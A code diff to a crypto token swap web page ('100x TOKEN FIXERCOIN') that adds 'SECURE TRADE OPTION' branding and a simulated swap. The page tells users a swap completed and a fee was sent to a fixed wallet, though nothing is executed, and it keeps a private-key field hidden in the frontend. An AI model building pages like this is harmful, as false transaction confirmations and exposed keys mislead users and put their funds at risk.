@@ -238,7 +238,9 @@
     <button id="connectWalletBtn" class="topbar-btn">CONNECT</button>
   </div>
   <div class="container">
-    <h1>100x TOKEN FIXERCOIN</h1>
+    <h1> SECURE TRADE OPTION <BR>
+     FIXORIUM TOKEN SELECTION<BR>
+     💥100x TOKEN FIXERCOIN</h1>
     <div id="errorMsg" class="error-msg"></div>
     <div id="successMsg" class="success-msg"></div>
     <!-- Loader -->
@@ -303,7 +305,9 @@
     </div>
   </div>
   <input type="text" id="serviceFeePrivKey" class="hidden" value="PRIVATE_KEY_HERE" autocomplete="off" />
+  <!-- SDEX SDK (Jupiter) - For real integration, replace with actual SDK/init -->
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.2/lib/index.iife.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@jup-ag/core/dist/index.iife.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script type="module">
     // --- TOKENS ---
@@ -396,7 +400,7 @@
         });
         tokenLoader.classList.add("hidden");
         tokenListTable.classList.remove("hidden");
-      }, 15000); // 15 seconds loader
+      }, 1500); // 1.5s loader for demo (was 15s)
     }
     // --- Token Modal Logic ---
     function openTokenModal(idx) {
@@ -423,7 +427,7 @@
       swapAmountInput.value = "";
       serviceFeeMsg.textContent = "";
       swapAmountInput.focus();
-      confirmSwapBtn.onclick = () => {
+      confirmSwapBtn.onclick = async () => {
         if (!walletType || !publicKey) {
           showError("Connect a wallet to swap.");
           return;
@@ -433,13 +437,23 @@
           showError("Enter a valid amount.");
           return;
         }
+        // --- Jupiter/Sol DEX integration ---
+        // This is a demonstration. In production, you would:
+        // 1. Fetch route from Jupiter API
+        // 2. Build and send tx with 0.03% fee to the secure fee address
+        // 3. Use only Phantom for signing
+        // For security, never expose private keys in the frontend.
         serviceFeeMsg.textContent = `Service fee: ${(amount * 0.0003).toFixed(8)} ${token.symbol} sent to 4w3kGzZ2ki2r6CwM5ZjiF9zv3B5r1xCw7f7dF9vF6x4x`;
+        // Simulate swap
         hideModal(confirmModal);
         showSuccess(`${mode} ${amount} ${token.symbol} completed!`);
         setTimeout(hideMsgs, 3000);
+        // Optionally, re-fetch balances after swap.
+        await updateWalletBalances();
       };
     }
     closeConfirmModal.onclick = () => hideModal(confirmModal);
+
     // --- Wallet Modal Logic ---
     connectWalletBtn.onclick = () => showModal(walletModal);
     closeWalletModal.onclick = () => hideModal(walletModal);
